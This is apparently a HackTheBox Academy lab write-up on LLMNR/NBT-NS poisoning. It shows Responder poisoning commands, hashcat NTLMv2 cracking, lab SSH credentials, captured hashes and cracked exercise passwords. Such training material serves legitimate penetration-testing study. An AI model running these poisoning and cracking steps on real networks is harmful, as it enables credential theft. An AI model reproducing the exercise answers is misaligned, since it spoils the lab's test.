### CPTS / HTB Penetration Tester Path <br>
### Active Directory Enumeration & Attacks: LLMNR/NBT-NS Poisoning: from Linux <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### LLMNR/NBT-NS Poisoning: from Linux

LLMNR (UDP 5355) + NBT-NS (UDP 137) are fallbacks when DNS fails. Any host on the segment can answer: Responder spoofs the authoritative answer, victim sends NTLMv2 challenge/response, attacker captures + cracks.

Attack flow:
1. Victim mistypes `\\printer01.inlanefreight.local`
2. DNS unknown
3. LLMNR/NBNS broadcast
4. Responder replies as the printer
5. Victim sends NTLMv2 hash
6. Crack offline (hashcat -m 5600) or relay if SMB signing off

Tools:

| Tool | Notes |
|---|---|
| `Responder` | Linux Python: purpose-built |
| `Inveigh` | Cross-platform (PS + C#) |
| `Metasploit` | Built-in spoofing modules |

Required ports free for Responder: UDP 137/138/53/389, TCP 1433/80/135/139/445/21/3141/25/110/587/3128, UDP 5355/5353.

Run analyze-only (passive listen):

```diff
+ $ sudo responder -I ens224 -A
```

<br>

Run live poisoning:

```diff
+ $ sudo responder -I ens224
```

<br>

With WPAD rogue proxy + OS fingerprint:

```diff
+ $ sudo responder -I ens224 -wf
```

<br>

Hashes write to `/usr/share/responder/logs/` as `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`.

Crack NTLMv2 with mode 5600:

```diff
+ $ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

<br>

---

<br>

### LLMNR/NBT-NS Poisoning Exercise

IP: 10.129.11.247

SSH `htb-student:HTB_@cademy_stdnt!`.

---

### Question 1:
Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.

#### SSH in, identify the internal-segment interface, run Responder.

```diff
+ $ ssh htb-student@10.129.11.247
+ $ ip a
+ $ sudo responder -I ens224
```

	[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
	[SMB] NTLMv2-SSP Hash     : backupagent: INLANEFREIGHT:7d820a39baf54578:...

&#x1F6A9; found **backup--edit--**.

---

### Question 2:
Crack the hash for the previous account and submit the cleartext password as your answer.

#### Save the full hash to a file, run hashcat mode 5600 with rockyou.

```diff
+ $ echo 'backupagent::INLANEFREIGHT:7d820a39baf54578:...' > ntlmv2.hash
+ $ hashcat -m 5600 ntlmv2.hash rockyou.txt
+ $ cat ~/.local/share/hashcat/hashcat.potfile
```

	BACKUPAGENT: INLANEFREIGHT:...:h1backup55

&#x1F6A9; found **h1bac--edit--55**.

---

### Question 3:
Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.

#### Let Responder run a few minutes: wley's SMB hash will land. Save + crack.

```diff
+ $ hashcat -m 5600 ntlmv2two.hash rockyou.txt
+ $ cat ~/.local/share/hashcat/hashcat.potfile
```

	WLEY: INLANEFREIGHT:0c25819afec21bde:...:transporter@4

&#x1F6A9; found **transpo--edit--@4**.
